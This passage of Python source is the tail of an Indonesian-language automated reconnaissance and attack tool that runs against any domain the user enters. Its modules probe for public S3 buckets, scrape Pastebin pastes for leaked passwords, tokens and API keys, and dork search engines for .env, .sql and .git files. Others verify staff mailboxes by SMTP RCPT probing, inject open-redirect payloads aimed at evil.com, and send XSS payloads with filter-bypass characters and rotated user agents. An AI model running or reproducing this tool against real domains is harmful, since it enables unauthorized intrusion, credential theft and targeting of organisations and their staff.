                            hasil["issues"].append("DMARC: Policy 'p=none' terlalu permisif")
                        elif "p=quarantine" in r_text:
                            hasil["issues"].append("DMARC: Policy 'quarantine' digunakan (lebih baik daripada 'none')")
                        elif "p=reject" in r_text:
                            hasil["issues"].append("DMARC: Policy 'reject' digunakan (strong)")

                        break
                else:
                    print(f"{K}[~] DMARC record tidak ditemukan.{RESET}")
            except Exception as e:
                print(f"{M}[!] Gagal resolve DMARC: {e}{RESET}")

            print(f"{C}[*] Mengecek DKIM record untuk selector umum...{RESET}")
            for selector in ["default", "google", "mail", "selector1", "selector2", "smtp", "mx"]:
                dkim_domain = f"{selector}._domainkey.{domain}"
                try:
                    dkim_records = resolver.resolve(dkim_domain, "TXT")
                    for r in dkim_records:
                        r_text = str(r).strip(' "')
                        if r_text.startswith("v=DKIM1"):
                            hasil["DKIM"].append({selector: r_text})
                            LOGS.append({f"DKIM ({selector})": r_text})
                            print(f"{H}[✓] DKIM ditemukan untuk selector '{selector}': {r_text[:100]}...{RESET}")
                            break
                except Exception as e:
                    print(f"{K}[~] DKIM selector '{selector}' tidak ditemukan: {e}{RESET}")
                    continue

            if not any([hasil["SPF"], hasil["DKIM"], hasil["DMARC"]]):
                print(f"{M}[!] Tidak ditemukan SPF, DKIM, atau DMARC pada domain ini!{RESET}")
            else:
                print(f"{C}\n[*] Ringkasan Analisa SPF/DKIM/DMARC:{RESET}")
                print(f"{B}    SPF   : {hasil['SPF'] or 'N/A'}{RESET}")
                print(f"{B}    DKIM  : {len(hasil['DKIM'])} selector ditemukan{RESET}")
                print(f"{B}    DMARC : {hasil['DMARC'] or 'N/A'}{RESET}")
                if hasil["issues"]:
                    print(f"{M}    ⚠️ Potensi kelemahan konfigurasi ditemukan:{RESET}")
                    for issue in hasil["issues"]:
                        print(f"{M}      → {issue}{RESET}")
                else:
                    print(f"{H}    ✓ Tidak ditemukan konfigurasi email authentication yang lemah.{RESET}")

            LOGS.append({"email_auth_audit": hasil})

        except Exception as e:
            print(f"{M}[!] siSpfDkim: Gagal mendapatkan record DNS atau analisa gagal - {e}{RESET}")
                
class siTechyFinder:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siTechyFinder: Melakukan fingerprint teknologi untuk {domain}{RESET}")
            url = f"https://{domain}"
            r = requests.get(url, headers=HEADERS(), timeout=10)

            hasil = {
                "cms": [],
                "framework": [],
                "cdn": [],
                "tracker": [],
                "library": [],
                "other": []
            }

            source = r.text.lower()
            headers_text = str(r.headers).lower()

            tech_fingerprint = {
                "WordPress": ["wp-content", "wp-includes", "wp-json"],
                "Shopify": ["cdn.shopify.com", "Shopify.theme"],
                "Drupal": ["sites/all", "drupal.settings"],
                "Magento": ["x-magento-vary", "magecookies"],
                "Ghost": ["<meta name=\"generator\" content=\"Ghost"],
                "Joomla": ["joomla!", "com_content"],

                "Laravel": ["laravel_session", "x-powered-by: laravel"],
                "Symfony": ["symfony"],
                "Django": ["csrftoken", "set-cookie: django"],
                "CodeIgniter": ["ci_session"],
                "Spring Boot": ["whitelabel error page"],

                "React.js": ["react", "data-reactroot"],
                "Vue.js": ["vue", "vue.config"],
                "Angular": ["ng-app", "angular"],
                "Svelte": ["svelte"],

                "Bootstrap": ["bootstrap.min.css"],
                "Tailwind": ["tailwind.min.css"],
                "FontAwesome": ["fontawesome", "fa fa-"],
                "Material UI": ["material-ui"],

                "Google Analytics": ["google-analytics.com/analytics.js"],
                "Facebook Pixel": ["connect.facebook.net/en_US/fbevents.js"],
                "Hotjar": ["static.hotjar.com"],
                "Tag Manager": ["googletagmanager.com"],

                "Cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
                "Akamai": ["akamai"],
                "Fastly": ["fastly"],
                "StackPath": ["stackpath"]
            }

            for tech, patterns in tech_fingerprint.items():
                for p in patterns:
                    if p.lower() in source or p.lower() in headers_text:
                        if tech in ["WordPress", "Shopify", "Ghost", "Drupal", "Joomla", "Magento"]:
                            hasil["cms"].append(tech)
                        elif tech in ["Laravel", "Symfony", "Django", "CodeIgniter", "Spring Boot"]:
                            hasil["framework"].append(tech)
                        elif tech in ["React.js", "Vue.js", "Angular", "Svelte"]:
                            hasil["framework"].append(tech)
                        elif tech in ["Bootstrap", "Tailwind", "FontAwesome", "Material UI"]:
                            hasil["library"].append(tech)
                        elif tech in ["Google Analytics", "Facebook Pixel", "Hotjar", "Tag Manager"]:
                            hasil["tracker"].append(tech)
                        elif tech in ["Cloudflare", "Akamai", "Fastly", "StackPath"]:
                            hasil["cdn"].append(tech)
                        else:
                            hasil["other"].append(tech)
                        break  # cukup satu pattern match

            total = sum(len(v) for v in hasil.values())

            if total:
                print(f"{H}[✓] Teknologi ditemukan: {total} identifikasi{RESET}")
                for kategori, data in hasil.items():
                    if data:
                        print(f"{B}    ▸ {kategori.upper()}: {RESET}{', '.join(set(data))}")
                LOGS.append({"tech_detected": hasil})
            else:
                print(f"{K}[~] Tidak ada fingerprint teknologi yang terdeteksi di halaman ini.{RESET}")
                LOGS.append({"tech_detected": "Tidak ditemukan fingerprint umum"})

        except Exception as e:
            print(f"{M}[!] siTechyFinder: Gagal mendeteksi teknologi - {e}{RESET}")
                
class siS3Hunter:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siS3Hunter: Mengecek visibilitas dan konten dari bucket AWS S3 yang terkait dengan: {domain}{RESET}")
            s3_variants = [
                f"http://{domain}.s3.amazonaws.com",
                f"http://{domain}.s3-us-west-1.amazonaws.com",
                f"http://{domain}.s3-ap-southeast-1.amazonaws.com",
                f"http://{domain}.s3-eu-west-1.amazonaws.com",
                f"http://{domain}.s3-us-east-2.amazonaws.com",
                f"http://{domain}.s3-sa-east-1.amazonaws.com"
            ]

            hasil_buckets = []
            for s3_url in s3_variants:
                try:
                    print(f"{B}[~] Mengakses bucket: {s3_url}{RESET}")
                    r = requests.get(s3_url, timeout=10)
                    content = r.text

                    bucket_status = "Unknown"
                    objects = []
                    region = re.search(r"<Region>(.*?)</Region>", content)
                    error_code = re.search(r"<Code>(.*?)</Code>", content)

                    if "ListBucketResult" in content:
                        bucket_status = "Public"
                        items = re.findall(r"<Key>(.*?)</Key>", content)
                        objects = items[:5]
                        print(f"{H}[✓] Bucket publik TERDETEKSI di {s3_url}{RESET}")
                        print(f"{C}    ↪ Contoh objek yang tersedia:")
                        for item in objects:
                            print(f"{B}       → {item}{RESET}")
                    elif "AccessDenied" in content:
                        bucket_status = "Exist but Denied"
                        print(f"{K}[~] Bucket ditemukan namun akses ditolak: {s3_url}{RESET}")
                    elif "NoSuchBucket" in content or r.status_code == 404:
                        bucket_status = "Not Found"
                        print(f"{M}[x] Bucket tidak ditemukan: {s3_url}{RESET}")
                    else:
                        bucket_status = "Unclear"
                        print(f"{K}[~] Respon ambigu, butuh pengecekan manual: {s3_url}{RESET}")

                    hasil_buckets.append({
                        "url": s3_url,
                        "status": bucket_status,
                        "region": region.group(1) if region else "Unknown",
                        "sample_objects": objects,
                        "error_code": error_code.group(1) if error_code else "None"
                    })

                except Exception as sub_e:
                    print(f"{M}[!] Error saat cek {s3_url} → {sub_e}{RESET}")
                    hasil_buckets.append({
                        "url": s3_url,
                        "status": "Request Failed",
                        "error": str(sub_e)
                    })

            if hasil_buckets:
                LOGS.append({"s3_hunter": hasil_buckets})
                print(f"{H}[✓] Total percobaan bucket: {len(hasil_buckets)} selesai{RESET}")
            else:
                print(f"{K}[~] Tidak ada bucket yang dapat diproses.{RESET}")

        except Exception as e:
            print(f"{M}[!] siS3Hunter: Terjadi error umum saat eksekusi - {e}{RESET}")
                
class siPastebinNinja:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siPastebinNinja: Melakukan pencarian OSINT Pastebin untuk domain: {domain}{RESET}")
            queries = [
                f"{domain}",
                f"{domain} password",
                f"{domain} token",
                f"{domain} api_key",
                f"admin@{domain}"
            ]

            found_links = []
            leak_keywords = ["password", "token", "api_key", "secret", "auth", "aws", "credential"]
            leak_matches = {}

            for q in queries:
                search_url = f"https://pastebin.com/search?q={quote(q)}"
                print(f"{B}    ↪ Mencari: {q}{RESET}")
                try:
                    r = requests.get(search_url, headers=HEADERS(), timeout=10)
                    if r.status_code == 200:
                        paste_ids = re.findall(r"/[a-zA-Z0-9]{8}", r.text)
                        unique_ids = list(set(paste_ids))
                        for pid in unique_ids:
                            full_url = f"https://pastebin.com{pid}"
                            if full_url not in found_links:
                                found_links.append(full_url)
                    elif r.status_code == 429:
                        print(f"{K}[~] Rate Limit: Pastebin membatasi pencarian, coba lagi nanti...{RESET}")
                        break
                    else:
                        print(f"{M}[!] Gagal mengambil hasil untuk query: {q} (status: {r.status_code}){RESET}")
                except Exception as e:
                    print(f"{M}[!] Error saat query Pastebin: {e}{RESET}")
                    continue

            print(f"{C}[*] Total hasil unik dari Pastebin: {len(found_links)} link{RESET}")
            preview_count = 0

            for link in found_links[:5]:  
                try:
                    raw_url = link.replace("pastebin.com/", "pastebin.com/raw/")
                    res = requests.get(raw_url, headers=HEADERS(), timeout=8)
                    content = res.text.lower()
                    found_leaks = [key for key in leak_keywords if key in content]
                    if found_leaks:
                        leak_matches[link] = found_leaks
                        print(f"{H}[✓] Potensi kebocoran ditemukan di {link} → keyword: {', '.join(found_leaks)}{RESET}")
                        preview_count += 1
                except Exception as e:
                    print(f"{K}[~] Tidak bisa akses raw content dari: {link} - {e}{RESET}")
                    continue

            result_log = {
                "pastebin_search_links": found_links,
                "pastebin_leak_detected": leak_matches,
                "total_dork": len(queries),
                "total_links": len(found_links),
                "preview_checked": preview_count
            }

            LOGS.append({"pastebin_osint": result_log})

            if not found_links:
                print(f"{K}[~] Tidak ada hasil paste ditemukan untuk domain {domain}{RESET}")
            elif not leak_matches:
                print(f"{K}[~] Paste ditemukan, tapi belum terlihat bocoran keywords. Tetap cek manual!{RESET}")
            else:
                print(f"{H}[✓] Potensi kebocoran terdeteksi di {len(leak_matches)} paste!{RESET}")

        except Exception as e:
            print(f"{M}[!] siPastebinNinja: Terjadi kesalahan fatal saat pencarian Pastebin - {e}{RESET}")
            
class siSocmedSpy:
    def jalan(self, domain):
        try:
            email = f"admin@{domain}"
            print(f"{C}[*] siSocmedSpy: Melacak jejak sosial untuk email & domain: {email}{RESET}")
            urls = {}

            linkedin_url = f"https://www.linkedin.com/search/results/all/?keywords={email}"
            urls["LinkedIn Search"] = linkedin_url

            hunter_url = f"https://hunter.io/search/{domain}"
            urls["Hunter.io Lookup"] = hunter_url

            google_dork = f"https://www.google.com/search?q=site:linkedin.com+OR+site:twitter.com+OR+site:facebook.com+\"{email}\""
            urls["Google Dork"] = google_dork

            ddg_dork = f"https://duckduckgo.com/?q=\"{email}\"+site:linkedin.com+OR+site:twitter.com"
            urls["DuckDuckGo"] = ddg_dork

            emailrep_url = f"https://emailrep.io/{email}"
            urls["EmailRep.io"] = emailrep_url

            viewdns_url = f"https://viewdns.info/reversewhois/?q={domain}"
            urls["ViewDNS Reverse Whois"] = viewdns_url

            for k, v in urls.items():
                print(f"{H}[+] {k}:{RESET} {v}")

            patterns = [
                f"ceo@{domain}",
                f"support@{domain}",
                f"security@{domain}",
                f"firstname.lastname@{domain}",
                f"developer@{domain}",
                f"contact@{domain}"
            ]

            print(f"{B}[*] Menyusun kemungkinan pola email populer di {domain}:{RESET}")
            for em in patterns:
                print(f"{K}   → {em}{RESET}")

            LOGS.append({
                "socmed_recon": {
                    "base_email": email,
                    "generated_emails": patterns,
                    "search_urls": urls
                }
            })

        except Exception as e:
            print(f"{M}[!] siSocmedSpy: Gagal melakukan pelacakan sosial - {e}{RESET}")
                
class siBingDorker:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siBingDorker: Melakukan dorking Bing terhadap file dan direktori sensitif di {domain}{RESET}")
            dork_queries = [
                f"site:{domain} filetype:env",
                f"site:{domain} filetype:log",
                f"site:{domain} filetype:sql",
                f"site:{domain} filetype:json",
                f"site:{domain} filetype:conf",
                f"site:{domain} filetype:xml",
                f"site:{domain} ext:bak | ext:old | ext:backup",
                f"site:{domain} intitle:index.of",
                f"site:{domain} inurl:admin",
                f"site:{domain} inurl:login",
                f"site:{domain} filetype:htaccess",
                f"site:{domain} filetype:git",
                f"site:{domain} ext:xls OR ext:xlsx",
            ]

            all_results = []
            raw_urls = set()

            for q in dork_queries:
                print(f"{H}  [+] Bing Dorking: {q}{RESET}")
                url = f"https://www.bing.com/search?q={quote(q)}"
                try:
                    r = requests.get(url, headers=HEADERS(), timeout=10)
                    if r.status_code == 200:
                        matches = re.findall(r"https?://[^\s\"'<>]+", r.text)
                        unique_matches = [u.strip().rstrip("/.") for u in matches if domain in u]
                        for match in unique_matches:
                            raw_urls.add(match)
                        print(f"{C}    [~] {len(unique_matches)} link ditemukan dari query ini{RESET}")
                    else:
                        print(f"{K}    [x] Gagal request - Status: {r.status_code}{RESET}")
                except Exception as bing_err:
                    print(f"{M}    [!] Gagal akses Bing untuk query: {q} - {bing_err}{RESET}")
                    continue

            if raw_urls:
                final_results = []
                for link in sorted(raw_urls):
                    lower = link.lower()
                    sensitivity = []
                    if any(x in lower for x in [".env", ".log", ".sql", ".bak", ".old", ".git", ".conf", ".xml", ".htaccess", "backup", "dump"]):
                        sensitivity.append("🔐 sensitive_file")
                    if "admin" in lower or "login" in lower:
                        sensitivity.append("🛡️ auth_page")
                    if "index.of" in lower:
                        sensitivity.append("📂 open_directory")

                    final_results.append({
                        "url": link,
                        "flags": sensitivity
                    })

                LOGS.append({"bing_dork": final_results})

                print(f"{H}[✓] Total hasil unik Bing Dorking: {len(final_results)}{RESET}")
                for res in final_results[:5]:
                    flags = ", ".join(res["flags"]) if res["flags"] else "None"
                    print(f"{B}     ➤ {res['url']} {K}[{flags}]{RESET}")
                if len(final_results) > 5:
                    print(f"{C}     ➤ ...dan {len(final_results) - 5} lainnya.{RESET}")
            else:
                print(f"{K}[~] Tidak ada hasil valid ditemukan dari Bing untuk {domain}.{RESET}")
                LOGS.append({"bing_dork": "no_result"})

        except Exception as e:
            print(f"{M}[!] siBingDorker: Gagal besar saat melakukan recon - {e}{RESET}")
                
class siLoginPageSniper:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siLoginPageSniper: Mendeteksi halaman login tersembunyi dan eksplisit di {domain}{RESET}")
            hints = [
                "admin", "login", "signin", "dashboard", "cpanel", "account", "user", "auth",
                "secure", "access", "panel", "system", "member", "staff", "portal", "verify"
            ]
            login_detected = []
            redirect_check = []
            redirect_depth = 0

            for path in hints:
                url = f"https://{domain}/{path}"
                try:
                    r = requests.get(url, timeout=6, headers=HEADERS(), allow_redirects=False)
                    status = r.status_code
                    content = r.text.lower()

                    # Deteksi redirect ke login
                    if status in [301, 302] and "location" in r.headers:
                        to = r.headers.get("Location", "")
                        redirect_check.append((url, to))
                        if any(kw in to.lower() for kw in ["login", "auth", "signin", "account"]):
                            login_detected.append(to)
                            print(f"{H}[✓] Redirect login ditemukan: {url} ➝ {to}{RESET}")
                        else:
                            print(f"{B}[→] Redirect non-login: {url} ➝ {to}{RESET}")
                        continue

                    if status == 200:
                        keyword_score = sum([
                            kw in content for kw in ["login", "signin", "username", "password", "auth"]
                        ])
                        form_check = re.findall(r"<form.*?>", content)
                        input_check = re.findall(r"<input[^>]+(type=['\"]?password['\"]?)", content)

                        if keyword_score >= 2 or input_check:
                            login_detected.append(url)
                            print(f"{H}[✓] Halaman login eksplisit terdeteksi di: {url}{RESET}")
                        elif "react" in content or "vue" in content:
                            if "login" in content or "auth" in content:
                                print(f"{K}[~] Kemungkinan login via JavaScript SPA: {url} (React/Vue){RESET}")
                        else:
                            print(f"{K}[~] {url} aktif, namun belum cukup bukti form login.{RESET}")
                except Exception as e:
                    print(f"{M}[!] Gagal akses {url} - {e}{RESET}")
                    continue

            login_classified = []
            for login_url in login_detected:
                sensitivity = "HIGH" if any(kw in login_url.lower() for kw in ["admin", "cpanel", "system"]) else "MEDIUM"
                login_classified.append({
                    "url": login_url,
                    "sensitivity": sensitivity
                })

            if login_classified:
                LOGS.append({"login_pages": login_classified})
                print(f"{H}[✓] Total halaman login terdeteksi: {len(login_classified)}{RESET}")
                for l in login_classified:
                    print(f"{B}    ➤ {l['url']} {K}[Sensitivity: {l['sensitivity']}] {RESET}")
            else:
                print(f"{K}[~] Tidak ada halaman login eksplisit ditemukan.{RESET}")
                LOGS.append({"login_pages": []})

        except Exception as e:
            print(f"{M}[!] siLoginPageSniper: Gagal proses pencarian halaman login - {e}{RESET}")

class siOpenRedirectHunter:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siOpenRedirectHunter: Mendeteksi kerentanan Open Redirect tingkat lanjut di {domain}{RESET}")
            param = ["redirect", "next", "url", "return", "dest", "destination", "continue", "goto", "target"]
            payloads = [
                "https://evil.com", "//evil.com", "///evil.com", "http://evil.com",
                "https:%2f%2fevil.com", "https:%2F%2Fevil.com", "///evil.com/%2e%2e", "evil.com"
            ]
            hasil_final = []

            for p in param:
                for pay in payloads:
                    test_url = f"https://{domain}/?{p}={pay}"
                    try:
                        r = requests.get(test_url, headers=HEADERS(), timeout=6, allow_redirects=False)
                        loc = r.headers.get("Location", "")
                        body = r.text.lower()
                        status = r.status_code

                        redirect_confirmed = False
                        alasan = []

                        if pay.lower() in loc.lower():
                            alasan.append("Redirect via Location header")
                            redirect_confirmed = True

                        if f'url={pay.lower()}' in body or "meta http-equiv=\"refresh\"" in body:
                            alasan.append("Meta refresh redirect")
                            redirect_confirmed = True

                        if "window.location" in body or "location.href" in body:
                            if pay.lower() in body:
                                alasan.append("JavaScript redirect")
                                redirect_confirmed = True

                        if redirect_confirmed:
                            hasil_final.append({
                                "url": test_url,
                                "payload": pay,
                                "method": alasan,
                                "status": status
                            })
                            print(f"{H}[✓] Potensi Open Redirect → {test_url} | via {', '.join(alasan)}{RESET}")
                        else:
                            print(f"{K}[~] {test_url} tidak mengarah langsung ke payload ({status}){RESET}")

                    except Exception as e:
                        print(f"{M}[!] Gagal mengakses {test_url} - {e}{RESET}")
                        continue

            if hasil_final:
                LOGS.append({"open_redirect": hasil_final})
                print(f"{H}[✓] Total kerentanan Open Redirect terdeteksi: {len(hasil_final)}{RESET}")
                for h in hasil_final[:5]:
                    print(f"{B}    → {h['url']} | Method: {', '.join(h['method'])}{RESET}")
            else:
                print(f"{B}[i] Tidak ada Open Redirect eksplisit terdeteksi.{RESET}")
                LOGS.append({"open_redirect": []})

        except Exception as e:
            print(f"{M}[!] siOpenRedirectHunter: Terjadi kesalahan fatal - {e}{RESET}")
                
class siFaviconHashHunter:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siFaviconHashHunter: Mengambil favicon & melakukan fingerprinting pada {domain}{RESET}")
            url = f"https://{domain}/favicon.ico"
            headers = HEADERS()

            r = requests.get(url, timeout=8, headers=headers)
            if r.status_code != 200 or not r.content:
                print(f"{M}[!] Favicon tidak berhasil diambil dari {url}{RESET}")
                return

            content = r.content
            content_type = r.headers.get("Content-Type", "unknown")
            favicon_size = len(content)

            import hashlib, mmh3, base64
            md5 = hashlib.md5(content).hexdigest()
            sha1 = hashlib.sha1(content).hexdigest()
            sha256 = hashlib.sha256(content).hexdigest()
            base64_favicon = base64.encodebytes(content).decode()
            murmur_hash = mmh3.hash(base64_favicon)

            LOGS.append({
                "favicon_hash": {
                    "md5": md5,
                    "sha1": sha1,
                    "sha256": sha256,
                    "mmh3": murmur_hash,
                    "size_bytes": favicon_size,
                    "content_type": content_type
                }
            })

            print(f"{H}[✓] Hash berhasil dihitung untuk favicon {domain}:{RESET}")
            print(f"{B}    ↪ Content-Type : {content_type}{RESET}")
            print(f"{B}    ↪ Size         : {favicon_size} bytes{RESET}")
            print(f"{K}    ↪ MD5          : {md5}{RESET}")
            print(f"{K}    ↪ SHA1         : {sha1}{RESET}")
            print(f"{K}    ↪ SHA256       : {sha256}{RESET}")
            print(f"{K}    ↪ MurmurHash3  : {murmur_hash}{RESET}")
            fingerprint_dict = {
                "3a0fa0f7c48efedb4a9ad2dba3fa5b17": "Apache Default Page",
                "5d3f5f7bd8033cb7ad5603d97c0f4696": "cPanel Login",
                "e6e69bb58f6f78cbe9b294b0c71cde2e": "WordPress Admin",
                "d41d8cd98f00b204e9800998ecf8427e": "Empty/Blank favicon",
            }

            if md5 in fingerprint_dict:
                print(f"{K}[~] Favicon cocok dengan fingerprint lokal: {fingerprint_dict[md5]}{RESET}")
                LOGS.append({"favicon_fingerprint": fingerprint_dict[md5]})
            else:
                print(f"{C}[i] Favicon belum dikenali dari daftar fingerprint lokal.{RESET}")

            # Tampilkan Shodan Reverse Search URL (manual use)
            print(f"{C}[→] Gunakan MurmurHash3 untuk pencarian di Shodan: https://www.shodan.io/search?query=http.favicon.hash%3A{murmur_hash}{RESET}")
            LOGS.append({"shodan_favicon_query": f"http.favicon.hash:{murmur_hash}"})

        except Exception as e:
            print(f"{M}[!] siFaviconHashHunter: Gagal melakukan analisis favicon - {e}{RESET}")
                
class siEmailPatternCrafter:
    def jalan(self, domain):
        try:
            import smtplib
            import dns.resolver
            import socket
            import re

            print(f"{C}[*] siEmailPatternCrafter: Memulai crafting & verifikasi pola email di domain: {domain}{RESET}")

            if not re.match(r"^[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$", domain):
                print(f"{M}[!] Domain tidak valid secara sintaksis!{RESET}")
                return

            pola_prefix = [
                "admin", "ceo", "info", "sales", "support", "contact", "hello",
                "webmaster", "root", "billing", "hrd", "marketing", "dev", "it", "security"
            ]
            hasil_valid = []
            smtp_log = []
            catch_all = None

            try:
                mx_records = dns.resolver.resolve(domain, 'MX')
                sorted_mx = sorted(mx_records, key=lambda r: r.preference)
                mx_host = str(sorted_mx[0].exchange).rstrip('.')
                print(f"{H}[✓] MX Record utama: {mx_host}{RESET}")
            except Exception as e:
                mx_host = f"smtp.{domain}"
                print(f"{M}[!] Gagal resolve MX → fallback: {mx_host}{RESET}")
            try:
                smtp_banner_socket = socket.socket()
                smtp_banner_socket.settimeout(6)
                smtp_banner_socket.connect((mx_host, 25))
                banner = smtp_banner_socket.recv(1024).decode(errors="ignore").strip()
                print(f"{B}[•] SMTP Banner: {banner}{RESET}")
                smtp_banner_socket.close()
            except Exception as e:
                banner = "Tidak tersedia"
                print(f"{K}[~] Tidak bisa ambil banner SMTP - {e}{RESET}")

            for prefix in pola_prefix:
                email = f"{prefix}@{domain}"
                try:
                    server = smtplib.SMTP(mx_host, 25, timeout=10)
                    server.helo(name="scanner.cyberheroes.local")
                    server.mail("fake_sender@cyberheroes.local")
                    code, response = server.rcpt(email)
                    response_decoded = response.decode() if isinstance(response, bytes) else str(response)

                    smtp_log.append((email, code, response_decoded))

                    if code in [250, 251]:
                        hasil_valid.append(email)
                        print(f"{H}[✓] Email aktif: {email} ({code}) ➜ {response_decoded}{RESET}")
                    elif code == 550 and "catch-all" in response_decoded.lower():
                        catch_all = True
                        print(f"{K}[~] Catch-All Mail Server Detected! Semua email diterima meski tidak valid.{RESET}")
                    else:
                        print(f"{K}[×] Tidak valid: {email} ({code}) ➜ {response_decoded}{RESET}")
                    server.quit()
                except smtplib.SMTPServerDisconnected:
                    print(f"{M}[!] SMTP Disconnect mendadak pada verifikasi: {email}{RESET}")
                except Exception as e:
                    print(f"{M}[!] Gagal verifikasi {email} - {e}{RESET}")
                    continue

            if hasil_valid:
                print(f"{H}[✓] Ringkasan email aktif: {len(hasil_valid)} ditemukan!{RESET}")
                for em in hasil_valid:
                    print(f"{B}    → {em}{RESET}")
            else:
                print(f"{K}[~] Tidak ada email valid yang terdeteksi pada domain ini.{RESET}")

            LOGS.append({
                "email_pattern_result": {
                    "mx_host": mx_host,
                    "banner": banner,
                    "emails_tested": len(pola_prefix),
                    "emails_valid": hasil_valid,
                    "catch_all_detected": catch_all,
                    "smtp_log": smtp_log
                }
            })

        except Exception as e:
            print(f"{M}[!] siEmailPatternCrafter: Modul gagal dijalankan → {e}{RESET}")
                
class siGraphBuilder:
    def jalan(self, domain):
        try:
            import hashlib
            import datetime
            from collections import defaultdict

            print(f"{C}[*] siGraphBuilder: Membangun struktur graph hasil enumerasi domain: {domain}{RESET}")
            
            nodes = set()
            edges = []
            weighted_edges = defaultdict(int)
            jenis_hasil = defaultdict(int)
            modul_terlibat = defaultdict(list)

            timestamp = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
            domain_hash = hashlib.md5(domain.encode()).hexdigest()[:8]

            for log in LOGS:
                for modul, hasil in log.items():
                    modul_node = f"{modul}_{domain_hash}"
                    edges.append((domain, modul_node))
                    weighted_edges[(domain, modul_node)] += 1

                    nodes.update([domain, modul_node])
                    jenis_hasil[modul] += 1
                    modul_terlibat[modul].append(hasil)

            graph_data = {
                "timestamp": timestamp,
                "domain": domain,
                "hash_id": domain_hash,
                "nodes": sorted(list(nodes)),
                "edges": edges,
                "weighted_edges": dict(weighted_edges),
                "node_count": len(nodes),
                "edge_count": len(edges),
                "grouped_result": dict(modul_terlibat),
                "summary_stat": dict(jenis_hasil)
            }

            LOGS.append({"graph_edges": graph_data})

            print(f"{H}[✓] Graph berhasil dibentuk untuk domain {domain}{RESET}")
            print(f"{H}[✓] Node unik total     : {len(graph_data['nodes'])}{RESET}")
            print(f"{H}[✓] Relasi total (edges): {len(graph_data['edges'])}{RESET}")
            print(f"{C}[*] Relasi berdasarkan jenis modul yang berkontribusi:{RESET}")
            for jenis, total in sorted(jenis_hasil.items(), key=lambda x: x[1], reverse=True):
                print(f"{B}    ➤ {jenis} : {total} hasil log{RESET}")

            adjacency_list = defaultdict(list)
            for a, b in edges:
                adjacency_list[a].append(b)

            print(f"{K}[*] Contoh adjacency list untuk '{domain}':{RESET}")
            for target in adjacency_list[domain][:5]:
                print(f"{K}    → {target}{RESET}")
            if len(adjacency_list[domain]) > 5:
                print(f"{K}    ... dan {len(adjacency_list[domain]) - 5} node lainnya{RESET}")

        except Exception as e:
            print(f"{M}[!] siGraphBuilder: Gagal membangun struktur graph - {e}{RESET}")
                
class siAutoExploitStarter:
    def jalan(self, domain):
        try:
            from urllib.parse import quote
            import random
            import string
            import time

            print(f"{C}[*] siAutoExploitStarter: Memulai otomatisasi XSS testing adaptif untuk domain {domain}{RESET}")
            
            payloads = [
                "<script>alert(1)</script>",
                "\"><svg/onload=alert(1)>",
                "<img src=x onerror=prompt(1)>",
                "<details/open/ontoggle=confirm(1)>",
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>",
                "<a href=javascript:alert(1)>click</a>"
            ]

            params = ["q", "search", "input", "s", "keyword", "term"]
            bypass_chars = ["%00", "%0a", "%09", "%0d", "&apos;", "&quot;", "%3C", "%3E"]

            found_total = 0
            hasil_xss = []
            tested_urls = []
            adaptive_payloads = []

            for log in LOGS:
                if "dir" in log:
                    for base_url in log["dir"]:
                        for param in params:
                            for payload in payloads:
                                encoded_payload = quote(payload)
                                for bypass in bypass_chars:
                                    target_url = f"{base_url}?{param}={encoded_payload}{bypass}"
                                    tested_urls.append(target_url)

                                    headers = HEADERS()
                                    headers["User-Agent"] = random.choice(USER_AGENTS)

                                    try:
                                        r = requests.get(target_url, headers=headers, timeout=6)
                                        if payload.strip("<>").split("(")[0] in r.text:
                                            hasil = {
                                                "url": target_url,
                                                "payload": payload,
                                                "bypass": bypass,
                                                "header": headers.get("User-Agent"),
                                                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                                            }
                                            hasil_xss.append(hasil)
                                            print(f"{H}[✓] XSS terdeteksi di: {target_url}{RESET}")
                                            print(f"{B}     ↪ Payload: {payload} | Bypass: {bypass}{RESET}")
                                            found_total += 1
                                            break
                                    except Exception as e:
                                        print(f"{M}[!] Gagal eksploitasi ke {target_url} - {e}{RESET}")
                                        continue

            if hasil_xss:
                LOGS.append({"xss_auto": hasil_xss})
                print(f"{H}[✓] Total {found_total} eksploitasi XSS berhasil!{RESET}")
            else:
                print(f"{K}[!] Tidak ada XSS yang terefleksi dari payload teruji.{RESET}")

            LOGS.append({
                "xss_tested": tested_urls,
                "xss_total_payloads": len(payloads),
                "xss_params": params
            })

        except Exception as e:
            print(f"{M}[!] siAutoExploitStarter: Error utama selama testing - {e}{RESET}")

async def main(domain):
    modul = [
        siWhoisPasif(), siShodanKasian(), siDNSZoneBomb(), siSubdomainHunter(), siCorsKocak(),
        siWafDetektor(), siCDNHeadHunter(), siCmsNinja(), siPortManja(), siTlsSantuy(),
        siGithubDorking(), siEmailLeakHunter(), siSubfinder(), siJsDepFinger(),
        siAsnMaper(), siWaybackPeeker(), siJsEndpointHunter(), siDirForce(), siVHostFinder(),
        siSpfDkim(), siTechyFinder(), siS3Hunter(), siPastebinNinja(), siSocmedSpy(),
        siBingDorker(), siLoginPageSniper(), siOpenRedirectHunter(), siFaviconHashHunter(),
        siEmailPatternCrafter(), siGraphBuilder(), siAutoExploitStarter()
    ]

    threads = []  

    for m in modul:
        t = threading.Thread(target=m.jalan, args=(domain,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    json_path = f"laporan_{domain}.json"
    txt_path = f"laporan_{domain}.txt"

    with open(json_path, "w") as f:
        json.dump(LOGS if LOGS else [{"info": "Tidak ada hasil ditemukan"}], f, indent=4)

    with open(txt_path, "w") as f:
        for l in LOGS if LOGS else [{"info": "Tidak ada hasil ditemukan"}]:
            f.write(json.dumps(l) + "\n")

    print(f"[✓] Laporan berhasil disimpan: {json_path} dan {txt_path}")


if __name__ == "__main__":
    target = input("Masukin domain target: ").strip()
    target = target.replace("https://", "").replace("http://", "").strip("/")
    asyncio.run(main(target))
